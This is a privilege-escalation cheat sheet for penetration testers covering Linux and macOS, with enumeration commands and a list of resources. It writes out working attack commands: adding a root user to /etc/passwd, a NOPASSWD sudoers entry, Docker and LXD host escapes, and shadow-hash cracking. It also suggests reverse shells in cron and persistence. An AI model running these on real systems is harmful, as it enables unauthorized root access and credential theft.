# Privilege Escalation Quick Reference

A quick cheat sheet of the most common privilege escalation vectors to check.

## 🐧 Linux - Top 20 PrivEsc Vectors

### 1. **Sudo Misconfigurations**
```bash
sudo -l                    # Check sudo privileges
sudo -l -U username        # Check specific user
```
**Look for**: NOPASSWD, ALL, dangerous binaries (vim, less, find, etc.)

### 2. **SUID Binaries**
```bash
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```
**Dangerous**: nmap, vim, find, bash, more, less, nano, cp, mv, awk, python, perl, ruby

### 3. **File Capabilities**
```bash
getcap -r / 2>/dev/null
```
**Look for**: cap_setuid, cap_dac_override, cap_chown

### 4. **Writable /etc/passwd or /etc/shadow**
```bash
ls -la /etc/passwd /etc/shadow
echo 'root2:x:0:0:root:/root:/bin/bash' >> /etc/passwd  # If writable
```

### 5. **Kernel Exploits**
```bash
uname -r                   # Check kernel version
searchsploit linux kernel $(uname -r)
```
**Common**: DirtyCow (< 4.8.3), Dirty Pipe (5.8 - 5.16.11)

### 6. **Docker Group**
```bash
id                         # Check groups
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 7. **LXD Group**
```bash
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
```

### 8. **Writable Cron Jobs**
```bash
ls -la /etc/cron* /var/spool/cron
```
Add reverse shell to writable cron script

### 9. **Writable Systemd Services**
```bash
find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null
```

### 10. **PATH Hijacking**
```bash
echo $PATH
# If writable directory in PATH, create malicious binary
```

### 11. **NFS no_root_squash**
```bash
cat /etc/exports
# Mount from attacker machine, create SUID binary
```

### 12. **Wildcard Injection**
```bash
# In cron or scripts using tar cf *, chown *, etc.
```

### 13. **LD_PRELOAD & LD_LIBRARY_PATH**
```bash
sudo -l                    # Check for env_keep
# Create malicious library if LD_PRELOAD preserved
```

### 14. **Password in Files**
```bash
grep -r "password" /etc 2>/dev/null
grep -r "password" /var/log 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
```

### 15. **SSH Keys**
```bash
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

### 16. **Readable /etc/shadow**
```bash
cat /etc/shadow
john hashes.txt
hashcat -m 1800 hashes.txt rockyou.txt
```

### 17. **Writable /etc/sudoers**
```bash
echo 'username ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

### 18. **SGID Binaries**
```bash
find / -perm -2000 2>/dev/null
```

### 19. **Polkit (pkexec) - CVE-2021-4034**
```bash
# PwnKit exploit if pkexec exists
```

### 20. **Scheduled Tasks with Relative Paths**
```bash
# If cron uses relative paths, PATH manipulation possible
```

---

## 🍎 macOS - Top 15 PrivEsc Vectors

### 1. **SIP Disabled**
```bash
csrutil status
# If disabled, can modify system files
```

### 2. **Writable LaunchDaemons**
```bash
find /Library/LaunchDaemons -type f -writable
# Add malicious plist to run at boot
```

### 3. **Sudo Misconfigurations**
```bash
sudo -l
```
**Look for**: NOPASSWD entries, dangerous binaries

### 4. **Writable PATH Directories**
```bash
echo $PATH | tr ':' '\n'
# Create malicious binaries in writable directories
```

### 5. **TCC Database Access**
```bash
# If ~/Library/Application Support/com.apple.TCC/TCC.db readable
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "SELECT * FROM access;"
```

### 6. **Writable /etc/sudoers**
```bash
ls -la /etc/sudoers /etc/sudoers.d/
```

### 7. **SUID Binaries**
```bash
find / -perm -4000 2>/dev/null
```

### 8. **Homebrew Writable**
```bash
ls -la /usr/local/Homebrew
# If writable, inject malicious packages
```

### 9. **Writable LaunchAgents**
```bash
find /Library/LaunchAgents ~/Library/LaunchAgents -writable
```

### 10. **Credentials in Plists**
```bash
plutil -p ~/Library/Preferences/*.plist | grep -i password
find /Library/Preferences -name "*.plist" -exec plutil -p {} \; 2>/dev/null
```

### 11. **Writable Cron/Periodic Scripts**
```bash
ls -la /etc/periodic/*
```

### 12. **DYLD Environment Variables**
```bash
env | grep DYLD
# DYLD_INSERT_LIBRARIES for library injection
```

### 13. **Gatekeeper Disabled**
```bash
spctl --status
# Easier to run malicious apps
```

### 14. **Automatic Login Configured**
```bash
defaults read /Library/Preferences/com.apple.loginwindow autoLoginUser
```

### 15. **SSH Keys and Authorized Keys**
```bash
find /Users -name "id_rsa" 2>/dev/null
find /Users -name "authorized_keys" 2>/dev/null
```

---

## 🔍 Initial Enumeration Commands

### Linux
```bash
id                         # Current user
whoami                     # Username
hostname                   # Hostname
cat /etc/os-release        # OS info
uname -a                   # Kernel
ps aux                     # Processes
netstat -tulpn             # Listening ports
ss -tulpn                  # Modern alternative
```

### macOS
```bash
id                         # Current user
whoami                     # Username
hostname                   # Hostname
sw_vers                    # OS version
uname -a                   # Kernel
csrutil status             # SIP status
ps aux                     # Processes
lsof -i -P -n | grep LISTEN  # Listening ports
```

---

## 📚 Essential Resources

- **GTFOBins**: https://gtfobins.github.io/
- **LOLBAS (Windows)**: https://lolbas-project.github.io/
- **HackTricks**: https://book.hacktricks.xyz/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **LinPEAS**: https://github.com/carlospolop/PEASS-ng
- **LinEnum**: https://github.com/rebootuser/LinEnum
- **Exploit-DB**: https://www.exploit-db.com/
- **CVE Details**: https://www.cvedetails.com/

---

## 🛠️ Exploitation Methodology

1. **Enumerate** - Run enumeration scripts
2. **Prioritize** - Focus on CRITICAL and HIGH-RISK findings
3. **Research** - Check GTFOBins, exploit-db, HackTricks
4. **Test** - Try exploits in safe manner
5. **Escalate** - Gain root/admin access
6. **Maintain** - Add persistence if needed
7. **Document** - Note steps for report

---

**Remember**: Only use on authorized systems! Unauthorized access is illegal.
